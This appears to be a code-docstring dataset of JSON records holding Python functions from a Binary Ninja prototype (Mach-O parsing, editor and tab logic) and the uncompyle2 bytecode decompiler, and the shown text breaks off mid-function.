{"docstring": "# Interpret DYLD_INFO instructions (not documented by Apple)\n# http://networkpx.blogspot.com/2009/09/about-lcdyldinfoonly-command.html\n", "func_signal": "def parse_dynamic_tables(self, tables):\n", "code": "ordinal = 0\nsegment = 0\noffset = 0\nsym_type = 0\nname = \"\"\n\nfor table in tables:\n\toffset = table[0]\n\tsize = table[1]\n\topcodes = self.data.read(offset, size)\n\ti = 0\n\twhile i < len(opcodes):\n\t\topcode = ord(opcodes[i])\n\t\ti += 1\n\t\tif (opcode >> 4) == 0:\n\t\t\tcontinue\n\t\telif (opcode >> 4) == 1:\n\t\t\tordinal = opcode & 0xf\n\t\telif (opcode >> 4) == 2:\n\t\t\tordinal, i = self.read_leb128(opcodes, i)\n\t\telif (opcode >> 4) == 3:\n\t\t\tordinal = -(opcode & 0xf)\n\t\telif (opcode >> 4) == 4:\n\t\t\tname = \"\"\n\t\t\twhile i < len(opcodes):\n\t\t\t\tch = opcodes[i]\n\t\t\t\ti += 1\n\t\t\t\tif ch == '\\x00':\n\t\t\t\t\tbreak\n\t\t\t\tname += ch\n\t\telif (opcode >> 4) == 5:\n\t\t\tsym_type = opcode & 0xf\n\t\telif (opcode >> 4) == 6:\n\t\t\taddend, i = self.read_leb128(opcodes, i)\n\t\telif (opcode >> 4) == 7:\n\t\t\tsegment = opcode & 0xf\n\t\t\toffset, i = self.read_leb128(opcodes, i)\n\t\telif (opcode >> 4) == 8:\n\t\t\trel, i = self.read_leb128(opcodes, i)\n\t\t\toffset += rel\n\t\telif (opcode >> 4) >= 9:\n\t\t\tif (sym_type == 1) and (segment <= len(self.segments)):\n\t\t\t\t# Add pointer type entries to the PLT\n\t\t\t\taddr = self.segments[segment - 1].vmaddr + offset\n\t\t\t\tself.plt[addr] = name\n\t\t\t\tself.create_symbol(addr, self.decorate_plt_name(name))\n\t\t\tif self.bits == 32:\n\t\t\t\toffset += 4\n\t\t\telse:\n\t\t\t\toffset += 8\n\t\t\tif (opcode >> 4) == 10:\n\t\t\t\trel, i = self.read_leb128(opcodes, i)\n\t\t\t\toffset += rel\n\t\t\telif (opcode >> 4) == 11:\n\t\t\t\toffset += (opcode & 0xf) * 4\n\t\t\telif (opcode >> 4) == 12:\n\t\t\t\tcount, i = self.read_leb128(opcodes, i)\n\t\t\t\tskip, i = self.read_leb128(opcodes, i)", "path": "MachOFile.py", "repo_name": "Vector35/deprecated-binaryninja-python", "stars": 517, "license": "gpl-2.0", "language": "python", "size": 1039}
{"docstring": "# Find sections that hold data backed by updated regions of the file\n", "func_signal": "def notify_data_write(self, data, ofs, contents):\n", "code": "for i in self.segments:\n\tif ((ofs + len(contents)) > i.fileoff) and (ofs < (i.fileoff + i.filesize)) and (i.vmsize != 0):\n\t\t# This section has been updated, compute which region has been changed\n\t\tfrom_start = ofs - i.fileoff\n\t\tdata_ofs = 0\n\t\tlength = len(contents)\n\t\tif from_start < 0:\n\t\t\tlength += from_start\n\t\t\tdata_ofs -= from_start\n\t\t\tfrom_start = 0\n\t\tif (from_start + length) > i.filesize:\n\t\t\tlength = i.filesize - from_start\n\n\t\t# Notify callbacks\n\t\tif length > 0:\n\t\t\tfor cb in self.callbacks:\n\t\t\t\tif hasattr(cb, \"notify_data_write\"):\n\t\t\t\t\tcb.notify_data_write(self, i.vmaddr + from_start,\n\t\t\t\t\t\tcontents[data_ofs:(data_ofs + length)])", "path": "MachOFile.py", "repo_name": "Vector35/deprecated-binaryninja-python", "stars": 517, "license": "gpl-2.0", "language": "python", "size": 1039}
{"docstring": "# Window was resized, adjust scroll bar\n", "func_signal": "def resizeEvent(self, event):\n", "code": "self.adjustSize(event.size().width(), event.size().height())\nself.repositionCaret()", "path": "TextEditor.py", "repo_name": "Vector35/deprecated-binaryninja-python", "stars": 517, "license": "gpl-2.0", "language": "python", "size": 1039}
{"docstring": "# Count the number of views open for this file\n", "func_signal": "def tabCloseRequested(self, tab, index):\n", "code": "view_count = 0\nfor i in range(0, self.tab.count()):\n\tif self.tab.widget(i).data == tab.widget(index).data:\n\t\tview_count += 1\nfor i in range(0, self.split_tab.count()):\n\tif self.split_tab.widget(i).data == tab.widget(index).data:\n\t\tview_count += 1\n\n# If this is the last view for this file and it has been modified, prompt for saving\nif (view_count == 1) and tab.widget(index).is_modified():\n\tif not self.save_prompt(tab, index):\n\t\treturn\n\n# Ask view if it is OK to close, and if it is complete the close\nwidget = tab.widget(index)\nif widget.view.closeRequest():\n\twidget.closing()\n\tif tab.widget(index) == widget:\n\t\ttab.removeTab(index)\n\tif tab.currentIndex() != -1:\n\t\ttab.currentWidget().view.setFocus(Qt.OtherFocusReason)\n\tself.evaluate_split_state()", "path": "binja.py", "repo_name": "Vector35/deprecated-binaryninja-python", "stars": 517, "license": "gpl-2.0", "language": "python", "size": 1039}
{"docstring": "# Determine the active tab so it can be preserved\n", "func_signal": "def split_single(self):\n", "code": "active_tab = None\nif self.focus_tab == self.tab:\n\tif self.tab.currentIndex() != -1:\n\t\tactive_tab = self.tab.widget(self.tab.currentIndex())\nelse:\n\tif self.split_tab.currentIndex() != -1:\n\t\tactive_tab = self.split_tab.widget(self.split_tab.currentIndex())\n\nself.split_tab.hide()\n\n# Move any remaining tabs over to the main pane\ntabs = []\nfor i in xrange(0, self.split_tab.count()):\n\ttabs.append(self.split_tab.widget(i))\nfor tab in tabs:\n\tself.tab.addTab(tab, tab.getTabName())\n\n# Reactivate tab that was active before\nfor i in xrange(0, self.tab.count()):\n\tif self.tab.widget(i) == active_tab:\n\t\tself.tab.setCurrentIndex(i)\n\t\tactive_tab.view.setFocus(Qt.OtherFocusReason)\n\t\tbreak", "path": "binja.py", "repo_name": "Vector35/deprecated-binaryninja-python", "stars": 517, "license": "gpl-2.0", "language": "python", "size": 1039}
{"docstring": "# Compute selection range\n", "func_signal": "def copy(self):\n", "code": "selStart, selEnd = self.get_selection_range_relative()\nif selEnd == selStart:\n\treturn\nself.write_range_to_clipboard(selStart, selEnd)", "path": "TextEditor.py", "repo_name": "Vector35/deprecated-binaryninja-python", "stars": 517, "license": "gpl-2.0", "language": "python", "size": 1039}
{"docstring": "# Binary search for the correct line for speed\n", "func_signal": "def offset_to_line(self, offset):\n", "code": "min_line = 0\nmax_line = len(self.lines)\nwhile min_line < max_line:\n\ti = int((min_line + max_line) / 2)\n\tif i < min_line:\n\t\ti = min_line\n\tif i >= max_line:\n\t\ti = max_line - 1\n\n\tif (offset >= self.lines[i].offset) and (offset < (self.lines[i].offset + self.lines[i].length +\n\t\tself.lines[i].newline_length)):\n\t\treturn i\n\n\tif offset < self.lines[i].offset:\n\t\tmax_line = i\n\telse:\n\t\tmin_line = i + 1\n\n# If line not found, was past the end of the buffer\nreturn len(self.lines) - 1", "path": "TextLines.py", "repo_name": "Vector35/deprecated-binaryninja-python", "stars": 517, "license": "gpl-2.0", "language": "python", "size": 1039}
{"docstring": "# Pick the view with the highest priority\n", "func_signal": "def create_tab(self, data, filename, forced_view = None):\n", "code": "best = None\nbestScore = -1\navailable = []\nfor i in ViewTypes:\n\tpriority = i.getPriority(data, filename)\n\tif priority > bestScore:\n\t\tbest = i\n\t\tbestScore = priority\n\tif priority >= 0:\n\t\tavailable += [i]\n\nif forced_view:\n\tbest = forced_view\n\n# Create view and add it as a tab\nframe = ViewFrame(best, data, filename, available)\nframe.statusUpdated.connect(self.statusUpdated)\nframe.viewChanged.connect(self.viewChanged)\nframe.closeRequest.connect(self.forceClose)\nindex = self.focus_tab.addTab(frame, frame.getTabName())\nself.focus_tab.setCurrentIndex(index)\nframe.view.setFocus(Qt.OtherFocusReason)\n\n# For text files, don't force save as when trying to save\nif (best == TextEditor) and (len(filename) > 0):\n\tframe.new_filename = True\n\nreturn frame", "path": "binja.py", "repo_name": "Vector35/deprecated-binaryninja-python", "stars": 517, "license": "gpl-2.0", "language": "python", "size": 1039}
{"docstring": "# Handle a write by simulating a delete then an insert\n", "func_signal": "def notify_data_write(self, data, offset, contents):\n", "code": "old_line_count = len(self.lines)\nself.handle_delete(offset, len(contents))\nfirst_line, line = self.handle_insert(offset, contents)\n\n# Update width and offsets for affected lines\nlines_affected = (len(self.lines) - old_line_count) + 1\nfor i in xrange(first_line, first_line + lines_affected):\n\tself.lines[i].recompute(self.data, self.tab_width)\n\n# Notify callbacks about any inserted or removed lines \nif len(self.lines) > old_line_count:\n\tfor cb in self.callbacks:\n\t\tif hasattr(cb, \"notify_insert_lines\"):\n\t\t\tcb.notify_insert_lines(self, first_line, len(self.lines) - old_line_count)\nelif len(self.lines) < old_line_count:\n\tfor cb in self.callbacks:\n\t\tif hasattr(cb, \"notify_remove_lines\"):\n\t\t\tcb.notify_remove_lines(self, line, old_line_count - len(self.lines))\n\n# Update syntax highlighting and notify callbacks about updates\ncount = self.update_highlight(first_line, lines_affected)\n\nfor cb in self.callbacks:\n\tif hasattr(cb, \"notify_update_lines\"):\n\t\tcb.notify_update_lines(self, first_line, count)\n\nself.update_max_width()", "path": "TextLines.py", "repo_name": "Vector35/deprecated-binaryninja-python", "stars": 517, "license": "gpl-2.0", "language": "python", "size": 1039}
{"docstring": "# Intercept tab events\n", "func_signal": "def event(self, event):\n", "code": "if (event.type() == QEvent.KeyPress) and (event.key() == Qt.Key_Tab):\n\tself.keyPressEvent(event)\n\treturn True\nelif (event.type() == QEvent.KeyPress) and (event.key() == Qt.Key_Backtab):\n\tself.keyPressEvent(event)\n\treturn True\nreturn super(TextEditor, self).event(event)", "path": "TextEditor.py", "repo_name": "Vector35/deprecated-binaryninja-python", "stars": 517, "license": "gpl-2.0", "language": "python", "size": 1039}
{"docstring": "'''\nFind the last <instr> in the block from start to end.\n<instr> is any python bytecode instruction or a list of opcodes\nIf <instr> is an opcode with a target (like a jump), a target\ndestination can be specified which must match precisely if exact\nis True, or if exact is False, the instruction which has a target\nclosest to <target> will be returned.\n\nReturn index to it or None if not found.\n'''\n\n", "func_signal": "def last_instr(self, start, end, instr, target=None, exact=True):\n", "code": "code = self.code\nif not (start>=0 and end<=len(code)):\n    return None\n\ntry:    None in instr\nexcept: instr = [instr]\n\npos = None\ndistance = len(code)\nfor i in self.op_range(start, end):\n    op = code[i]\n    if op in instr:\n        if target is None:\n            pos = i\n        else:\n            dest = self.get_target(i, op)\n            if dest == target:\n                distance = 0\n                pos = i\n            elif not exact:\n                _distance = abs(target - dest)\n                if _distance <= distance:\n                    distance = _distance\n                    pos = i\nreturn pos", "path": "uncompyle2\\scanner.py", "repo_name": "Mysterie/uncompyle2", "stars": 625, "license": "None", "language": "python", "size": 783}
{"docstring": "# we handle listExp, if opcode have to be resized\n", "func_signal": "def getOpcodeToExp(self):\n", "code": "listExp = []\ni=0\nwhile i < len(self.code): # we can't use op_range for the moment\n    op = self.code[i]\n    if op in self.opc.hasArgumentExtended:\n        listExp += [i]\n    elif self.op_hasArgument(op):\n        i+=2\n    i+=1\nreturn listExp", "path": "uncompyle2\\scanner26.py", "repo_name": "Mysterie/uncompyle2", "stars": 625, "license": "None", "language": "python", "size": 783}
{"docstring": "'''\nFind all <instr> in the block from start to end.\n<instr> is any python bytecode instruction or a list of opcodes\nIf <instr> is an opcode with a target (like a jump), a target\ndestination can be specified which must match precisely.\n\nReturn a list with indexes to them or [] if none found.\n'''\n\n", "func_signal": "def rem_or(self, start, end, instr, target=None, include_beyond_target=False):\n", "code": "code = self.code\nassert(start>=0 and end<=len(code))\n\ntry:    None in instr\nexcept: instr = [instr]\n\nresult = []\nfor i in self.op_range(start, end):\n    op = code[i]\n    if op in instr:\n        if target is None:\n            result.append(i)\n        else:\n            t = self.get_target(i, op)\n            if include_beyond_target and t >= target:\n                result.append(i)\n            elif t == target:\n                result.append(i)\n                \npjits = self.all_instr(start, end, self.opc.PJIT)\nfiltered = []\nfor pjit in pjits:\n    tgt = self.get_target(pjit)-3\n    for i in result:\n        if i <= pjit or i >= tgt:\n            filtered.append(i)\n    result = filtered\n    filtered = []\nreturn result", "path": "uncompyle2\\scanner.py", "repo_name": "Mysterie/uncompyle2", "stars": 625, "license": "None", "language": "python", "size": 783}
{"docstring": "'''\nReturn the next jump that was generated by an except SomeException:\nconstruct in a try...except...else clause or None if not found.\n'''\n\n", "func_signal": "def next_except_jump(self, start):\n", "code": "if self.code[start] == DUP_TOP:\n    except_match = self.first_instr(start, len(self.code), (PJIF))\n    if except_match:\n        jmp = self.prev[self.get_target(except_match)]\n        self.ignore_if.add(except_match)\n        self.not_continue.add(jmp)\n        return jmp\n\ncount_END_FINALLY = 0\ncount_SETUP_ = 0\nfor i in self.op_range(start, len(self.code)):\n    op = self.code[i]\n    if op == END_FINALLY:\n        if count_END_FINALLY == count_SETUP_:\n            if self.code[self.prev[i]] == NOP:\n                i = self.prev[i]\n            assert self.code[self.prev[i]] in (JA, JF, RETURN_VALUE)\n            self.not_continue.add(self.prev[i])\n            return self.prev[i]\n        count_END_FINALLY += 1\n    elif op in (SETUP_EXCEPT, SETUP_FINALLY):\n        count_SETUP_ += 1\n#return self.lines[start].next", "path": "uncompyle2\\scanner26.py", "repo_name": "Mysterie/uncompyle2", "stars": 625, "license": "None", "language": "python", "size": 783}
{"docstring": "\"\"\"\nexec_stmt ::= expr exprlist DUP_TOP EXEC_STMT\nexec_stmt ::= expr exprlist EXEC_STMT\n\"\"\"\n", "func_signal": "def n_exec_stmt(self, node):\n", "code": "self.write(self.indent, 'exec ')\nself.preorder(node[0])\nif node[1][0] != NONE:\n    sep = ' in '\n    for subnode in node[1]:\n        self.write(sep); sep = \", \"\n        self.preorder(subnode)\nself.print_()\nself.prune() # stop recursing", "path": "uncompyle2\\walker.py", "repo_name": "Mysterie/uncompyle2", "stars": 625, "license": "None", "language": "python", "size": 783}
{"docstring": "\"\"\"Find globals in this statement.\"\"\"\n", "func_signal": "def find_all_globals(node, globs):\n", "code": "for n in node:\n    if isinstance(n, AST):\n        globs = find_all_globals(n, globs)\n    elif n.type in ('STORE_GLOBAL', 'DELETE_GLOBAL', 'LOAD_GLOBAL'):\n        globs.add(n.pattr)\nreturn globs", "path": "uncompyle2\\walker.py", "repo_name": "Mysterie/uncompyle2", "stars": 625, "license": "None", "language": "python", "size": 783}
{"docstring": "# class definition ('class X(A,B,C):')\n", "func_signal": "def n_classdef(self, node):\n", "code": "cclass = self.currentclass\nself.currentclass = str(node[0].pattr)\n\nself.write('\\n\\n')\nself.write(self.indent, 'class ', self.currentclass)\nself.print_super_classes(node)\nself.print_(':')\n\n# class body\nself.indentMore()\nself.build_class(node[2][-2].attr)\nself.indentLess()\n\nself.currentclass = cclass\nif len(self.__param_stack) > 1:\n    self.write('\\n\\n')\nelse:\n    self.write('\\n\\n\\n')\n\nself.prune()", "path": "uncompyle2\\walker.py", "repo_name": "Mysterie/uncompyle2", "stars": 625, "license": "None", "language": "python", "size": 783}
{"docstring": "\"\"\"\nprettyprint a list or tuple\n\"\"\"\n", "func_signal": "def n_build_list(self, node):\n", "code": "p = self.prec\nself.prec = 100\nlastnode = node.pop().type\nif lastnode.startswith('BUILD_LIST'):\n    self.write('['); endchar = ']'\nelif lastnode.startswith('BUILD_TUPLE'):\n    self.write('('); endchar = ')'\nelif lastnode.startswith('BUILD_SET'):\n    self.write('{'); endchar = '}'\nelif lastnode.startswith('ROT_TWO'):\n    self.write('('); endchar = ')'\nelse:\n    raise 'Internal Error: n_build_list expects list or tuple'\n\nself.indentMore(INDENT_PER_LEVEL)\nif len(node) > 3:\n    line_separator = ',\\n' + self.indent\nelse:\n    line_separator = ', '\nsep = INDENT_PER_LEVEL[:-1]\nfor elem in node:\n    if (elem == 'ROT_THREE'):\n        continue\n\n    assert elem == 'expr'\n    value = self.traverse(elem)\n    self.write(sep, value)\n    sep = line_separator\nif len(node) == 1 and lastnode.startswith('BUILD_TUPLE'):\n    self.write(',')\nself.write(endchar)\nself.indentLess(INDENT_PER_LEVEL)\nself.prec = p\nself.prune()", "path": "uncompyle2\\walker.py", "repo_name": "Mysterie/uncompyle2", "stars": 625, "license": "None", "language": "python", "size": 783}
{"docstring": "'''\nchange relative JUMP_IF_FALSE/TRUE to absolut jump\nand remap the target of PJIF/PJIT\n'''\n", "func_signal": "def restructRelativeJump(self):\n", "code": "i=0\nwhile i < len(self.code): # we can't use op_range for the moment\n    op = self.code[i]\n    if(op in (PJIF,PJIT)):\n        target = self.get_argument(i)\n        target += i + 3\n        self.restructJump(i, target)\n    if self.op_hasArgument(op) and op not in self.opc.hasArgumentExtended:\n        i += 3\n    else: i += 1\n\ni=0\nwhile i < len(self.code): # we can't use op_range for the moment\n    op = self.code[i]\n    if(op in (PJIF,PJIT)):\n        target = self.get_target(i)\n        if self.code[target] == JA:\n            target = self.get_target(target)\n            self.restructJump(i, target)\n    if self.op_hasArgument(op) and op not in self.opc.hasArgumentExtended:\n        i += 3\n    else: i += 1", "path": "uncompyle2\\scanner26.py", "repo_name": "Mysterie/uncompyle2", "stars": 625, "license": "None", "language": "python", "size": 783}
{"docstring": "'''\nFind the first <instr> in the block from start to end.\n<instr> is any python bytecode instruction or a list of opcodes\nIf <instr> is an opcode with a target (like a jump), a target\ndestination can be specified which must match precisely if exact\nis True, or if exact is False, the instruction which has a target\nclosest to <target> will be returned.\n\nReturn index to it or None if not found.\n'''\n", "func_signal": "def first_instr(self, start, end, instr, target=None, exact=True):\n", "code": "code = self.code\nassert(start>=0 and end<=len(code))\n\ntry:    None in instr\nexcept: instr = [instr]\n\npos = None\ndistance = len(code)\nfor i in self.op_range(start, end):\n    op = code[i]\n    if op in instr:\n        if target is None:\n            return i\n        dest = self.get_target(i, op)\n        if dest == target:\n            return i\n        elif not exact:\n            _distance = abs(target - dest)\n            if _distance < distance:\n                distance = _distance\n                pos = i\nreturn pos", "path": "uncompyle2\\scanner.py", "repo_name": "Mysterie/uncompyle2", "stars": 625, "license": "None", "language": "python", "size": 783}
{"docstring": "'''\nFind all <instr> in the block from start to end.\n<instr> is any python bytecode instruction or a list of opcodes\nIf <instr> is an opcode with a target (like a jump), a target\ndestination can be specified which must match precisely.\n\nReturn a list with indexes to them or [] if none found.\n'''\n\n", "func_signal": "def all_instr(self, start, end, instr, target=None, include_beyond_target=False):\n", "code": "code = self.code\nassert(start>=0 and end<=len(code))\n\ntry:    None in instr\nexcept: instr = [instr]\n\nresult = []\nfor i in self.op_range(start, end):\n    op = code[i]\n    if op in instr:\n        if target is None:\n            result.append(i)\n        else:\n            t = self.get_target(i, op)\n            if include_beyond_target and t >= target:\n                result.append(i)\n            elif t == target:\n                result.append(i)\nreturn result", "path": "uncompyle2\\scanner.py", "repo_name": "Mysterie/uncompyle2", "stars": 625, "license": "None", "language": "python", "size": 783}
{"docstring": "\"\"\"convert AST to source code\"\"\"\n\n", "func_signal": "def gen_source(self, ast, customize, isLambda=0, returnNone=False):\n", "code": "rn = self.return_none\nself.return_none = returnNone\n# if code would be empty, append 'pass'\nif len(ast) == 0:\n    self.print_(self.indent, 'pass')\nelse:\n    self.customize(customize)\n    if isLambda:\n        self.write(self.traverse(ast, isLambda=isLambda))\n    else:\n        self.print_(self.traverse(ast, isLambda=isLambda))            \nself.return_none = rn", "path": "uncompyle2\\walker.py", "repo_name": "Mysterie/uncompyle2", "stars": 625, "license": "None", "language": "python", "size": 783}
{"docstring": "'''\nDetect all offsets in a byte code which are jump targets.\n\nReturn the list of offsets.\n\nThis procedure is modelled after dis.findlables(), but here\nfor each target the number of jumps are counted.\n'''\n\n", "func_signal": "def find_jump_targets(self, code):\n", "code": "n = len(code)\nself.structs = [{'type':  'root',\n                   'start': 0,\n                   'end':   n-1}]\nself.loops = []  ## All loop entry points\nself.fixed_jumps = {} ## Map fixed jumps to their real destination\nself.ignore_if = set()\nself.build_stmt_indices() \nself.not_continue = set()\nself.return_end_ifs = set()\n\ntargets = {}\nfor i in self.op_range(0, n):\n    op = code[i]\n\n    ## Determine structures and fix jumps for 2.3+\n    self.detect_structure(i, op)\n\n    if self.op_hasArgument(op):\n        label = self.fixed_jumps.get(i)\n        oparg = self.get_argument(i)  \n        if label is None:\n            if op in hasjrel and op != FOR_ITER:\n                label = i + 3 + oparg\n            #elif op in hasjabs: Pas de gestion des jump abslt\n                #if op in (PJIF, PJIT): Or pop a faire\n                    #if (oparg > i):\n                        #label = oparg\n        if label is not None and label != -1:\n            targets[label] = targets.get(label, []) + [i]\n    elif op == END_FINALLY and i in self.fixed_jumps:\n        label = self.fixed_jumps[i]\n        targets[label] = targets.get(label, []) + [i]\nreturn targets", "path": "uncompyle2\\scanner26.py", "repo_name": "Mysterie/uncompyle2", "stars": 625, "license": "None", "language": "python", "size": 783}
{"docstring": "\"\"\"\nprettyprint a mapexpr\n'mapexpr' is something like k = {'a': 1, 'b': 42 }\"\n\"\"\"\n", "func_signal": "def n_mapexpr(self, node):\n", "code": "p = self.prec\nself.prec = 100\nassert node[-1] == 'kvlist'\nnode = node[-1] # goto kvlist\n\nself.indentMore(INDENT_PER_LEVEL)\nline_seperator = ',\\n' + self.indent\nsep = INDENT_PER_LEVEL[:-1]\nself.write('{')\nfor kv in node:\n    assert kv in ('kv', 'kv2', 'kv3')\n    # kv ::= DUP_TOP expr ROT_TWO expr STORE_SUBSCR\n    # kv2 ::= DUP_TOP expr expr ROT_THREE STORE_SUBSCR\n    # kv3 ::= expr expr STORE_MAP\n    if kv == 'kv':\n        name = self.traverse(kv[-2], indent='');\n        value = self.traverse(kv[1], indent=self.indent+(len(name)+2)*' ')\n    elif kv == 'kv2':\n        name = self.traverse(kv[1], indent='');\n        value = self.traverse(kv[-3], indent=self.indent+(len(name)+2)*' ')\n    elif kv == 'kv3':\n        name = self.traverse(kv[-2], indent='');\n        value = self.traverse(kv[0], indent=self.indent+(len(name)+2)*' ')\n    self.write(sep, name, ': ', value)\n    sep = line_seperator\nself.write('}')\nself.indentLess(INDENT_PER_LEVEL)\nself.prec = p\nself.prune()", "path": "uncompyle2\\walker.py", "repo_name": "Mysterie/uncompyle2", "stars": 625, "license": "None", "language": "python", "size": 783}
{"docstring": "'''\nDetect type of block structures and their boundaries to fix optimizied jumps\nin python2.3+\n'''\n\n# TODO: check the struct boundaries more precisely -Dan\n\n", "func_signal": "def detect_structure(self, pos, op=None):\n", "code": "code = self.code\n# Ev remove this test and make op a mandatory argument -Dan\nif op is None:\n    op = code[pos]\n\n## Detect parent structure\nparent = self.structs[0]\nstart  = parent['start']\nend    = parent['end']\nfor s in self.structs:\n    _start = s['start']\n    _end   = s['end']\n    if (_start <= pos < _end) and (_start >= start and _end <= end):\n        start  = _start\n        end    = _end\n        parent = s\n## We need to know how many new structures were added in this run\norigStructCount = len(self.structs)\n\nif op == SETUP_LOOP:\n    start = pos+3\n    target = self.get_target(pos, op)\n    end    = self.restrict_to_parent(target, parent)\n\n    if target != end:\n        self.fixed_jumps[pos] = end\n    \n    (line_no, next_line_byte) = self.lines[pos]\n    jump_back = self.last_instr(start, end, JA,\n                                  next_line_byte, False)\n    if jump_back and jump_back != self.prev[end] and code[jump_back+3] in (JA, JF):\n        if code[self.prev[end]] == RETURN_VALUE or \\\n            (code[self.prev[end]] == POP_BLOCK and code[self.prev[self.prev[end]]] == RETURN_VALUE):\n            jump_back = None\n    if not jump_back: # loop suite ends in return. wtf right?\n        jump_back = self.last_instr(start, end, RETURN_VALUE)\n        if not jump_back:               \n            return\n        jump_back += 1\n        if code[self.prev[next_line_byte]] not in (PJIF, PJIT):\n            loop_type = 'for'\n        else:\n            loop_type = 'while'\n            self.ignore_if.add(self.prev[next_line_byte])\n        target = next_line_byte\n        end = jump_back + 3\n    else:\n        if self.get_target(jump_back) >= next_line_byte:\n            jump_back = self.last_instr(start, end, JA,\n                                      start, False)\n        if end > jump_back+4 and code[end] in (JF, JA):\n            if code[jump_back+4] in (JA, JF):\n                if self.get_target(jump_back+4) == self.get_target(end):\n                    self.fixed_jumps[pos] = jump_back+4\n                    end = jump_back+4\n        elif target < pos:\n            self.fixed_jumps[pos] = jump_back+4\n            end = jump_back+4\n         \n        target = self.get_target(jump_back, JA)\n\n        if code[target] in (FOR_ITER, GET_ITER):\n            loop_type = 'for'\n        else:\n            loop_type = 'while'\n            test = self.prev[next_line_byte]\n            if test == pos:\n                loop_type = 'while 1'\n            elif self.code[test] in hasjabs+hasjrel: \n                self.ignore_if.add(test)\n                test_target = self.get_target(test)\n                if test_target > (jump_back+3):\n                    jump_back = test_target\n        self.not_continue.add(jump_back)\n    self.loops.append(target)\n    self.structs.append({'type': loop_type + '-loop',\n                           'start': target,\n                           'end':   jump_back})\n    if jump_back+3 != end:\n        self.structs.append({'type': loop_type + '-else',\n                               'start': jump_back+3,\n                               'end':   end})\nelif op == SETUP_EXCEPT:\n    start  = pos+3\n    target = self.get_target(pos, op)\n    end    = self.restrict_to_parent(target, parent)\n    if target != end:\n        self.fixed_jumps[pos] = end\n        #print target, end, parent\n    ## Add the try block\n    self.structs.append({'type':  'try',\n                           'start': start,\n                           'end':   end-4})\n    ## Now isolate the except and else blocks\n    end_else = start_else = self.get_target(self.prev[end])\n\n    ## Add the except blocks\n    i = end\n    while i < len(self.code) and self.code[i] != END_FINALLY:\n        jmp = self.next_except_jump(i)\n        if jmp == None: # check\n            i = self.next_stmt[i]\n            continue\n        if self.code[jmp] == RETURN_VALUE:\n            self.structs.append({'type':  'except',\n                                   'start': i,\n                                   'end':   jmp+1})\n            i = jmp + 1\n        else:\n            if self.get_target(jmp) != start_else:\n                end_else = self.get_target(jmp)\n            if self.code[jmp] == JF:\n                #self.fixed_jumps[i] = jmp\n                self.fixed_jumps[jmp] = -1\n            self.structs.append({'type':  'except',\n                           'start': i,\n                           'end':   jmp})\n            i = jmp + 3   \n\n    ## Add the try-else block\n    if end_else != start_else:\n        r_end_else = self.restrict_to_parent(end_else, parent)\n        self.structs.append({'type':  'try-else',\n                               'start': i+2, # check\n                               'end':   r_end_else})\n        self.fixed_jumps[i] = r_end_else\n    else:\n        self.fixed_jumps[i] = i+1\n\nelif op in (PJIF, PJIT):\n    start = pos+3\n    target = self.get_target(pos, op)\n    rtarget = self.restrict_to_parent(target, parent)\n    pre = self.prev\n\n    if target != rtarget and parent['type'] == 'and/or':\n        self.fixed_jumps[pos] = rtarget\n        return\n    #does this jump to right after another cond jump?\n    # if so, it's part of a larger conditional\n    if (code[pre[target]] in (PJIF, PJIT)) and (target > pos):\n        self.fixed_jumps[pos] = pre[target]\n        self.structs.append({'type':  'and/or',\n                               'start': start,\n                               'end':   pre[target]})\n        return\n    \n    # is this an if and\n    if op == PJIF:\n        match = self.rem_or(start, self.next_stmt[pos], PJIF, target)\n        match = self.remove_mid_line_ifs(match)\n        if match:\n            if code[pre[rtarget]] in (JF, JA) \\\n                    and pre[rtarget] not in self.stmts \\\n                    and self.restrict_to_parent(self.get_target(pre[rtarget]), parent) == rtarget:\n                if code[pre[pre[rtarget]]] == JA \\\n                        and self.remove_mid_line_ifs([pos]) \\\n                        and target == self.get_target(pre[pre[rtarget]]) \\\n                        and (pre[pre[rtarget]] not in self.stmts or self.get_target(pre[pre[rtarget]]) > pre[pre[rtarget]])\\\n                        and 1 == len(self.remove_mid_line_ifs(self.rem_or(start, pre[pre[rtarget]], (PJIF, PJIT), target))):\n                    pass\n                elif code[pre[pre[rtarget]]] == RETURN_VALUE \\\n                        and self.remove_mid_line_ifs([pos]) \\\n                        and 1 == (len(set(self.remove_mid_line_ifs(self.rem_or(start, pre[pre[rtarget]], \\\n                                                     (PJIF, PJIT), target))) \\\n                                      | set(self.remove_mid_line_ifs(self.rem_or(start, pre[pre[rtarget]], \\\n                                                   (PJIF, PJIT, JA), pre[rtarget], True))))):\n                    pass\n                else:\n                    fix = None\n                    jump_ifs = self.all_instr(start, self.next_stmt[pos], PJIF)\n                    last_jump_good = True\n                    for j in jump_ifs:\n                        if target == self.get_target(j):\n                            if self.lines[j].next == j+3 and last_jump_good:\n                                fix = j\n                                break\n                        else:\n                            last_jump_good = False\n                    self.fixed_jumps[pos] = fix or match[-1]\n                    return\n            elif pos < rtarget and code[target] == ROT_TWO:\n                self.fixed_jumps[pos] = target \n                return\n            else:\n                self.fixed_jumps[pos] = match[-1]\n                return\n    else: # op == PJIT\n        if (pos+3) in self.load_asserts:\n            if code[pre[rtarget]] == RAISE_VARARGS:\n                return\n            self.load_asserts.remove(pos+3)\n        \n        next = self.next_stmt[pos]\n        if pre[next] == pos:\n            pass\n        elif code[next] in (JF, JA) and target == self.get_target(next):\n            if code[pre[next]] == PJIF:\n                if code[next] == JF or target != rtarget or code[pre[pre[rtarget]]] not in (JA, RETURN_VALUE):\n                    self.fixed_jumps[pos] = pre[next]\n                    return\n        elif code[next] == JA and code[target] in (JA, JF) \\\n              and self.get_target(target) == self.get_target(next):\n            self.fixed_jumps[pos] = pre[next]\n            return\n    #don't add a struct for a while test, it's already taken care of\n    if pos in self.ignore_if:\n        return\n \n    if code[pre[rtarget]] == JA and pre[rtarget] in self.stmts \\\n            and pre[rtarget] != pos and pre[pre[rtarget]] != pos \\\n            and not (code[rtarget] == JA and code[rtarget+3] == POP_BLOCK and code[pre[pre[rtarget]]] != JA):\n        rtarget = pre[rtarget]\n    #does the if jump just beyond a jump op, then this is probably an if statement\n    if code[pre[rtarget]] in (JA, JF):\n        if_end = self.get_target(pre[rtarget])\n        \n        #is this a loop not an if?\n        if (if_end < pre[rtarget]) and (code[pre[if_end]] == SETUP_LOOP):\n            if(if_end > start):\n                return\n                \n        end = self.restrict_to_parent(if_end, parent)\n                                               \n        self.structs.append({'type':  'if-then',\n                               'start': start,\n                               'end':   pre[rtarget]})\n        self.not_continue.add(pre[rtarget])\n        \n        if rtarget < end:\n            self.structs.append({'type':  'if-else',\n                               'start': rtarget,\n                               'end':   end})\n    elif code[pre[rtarget]] == RETURN_VALUE:\n        # if it's an old 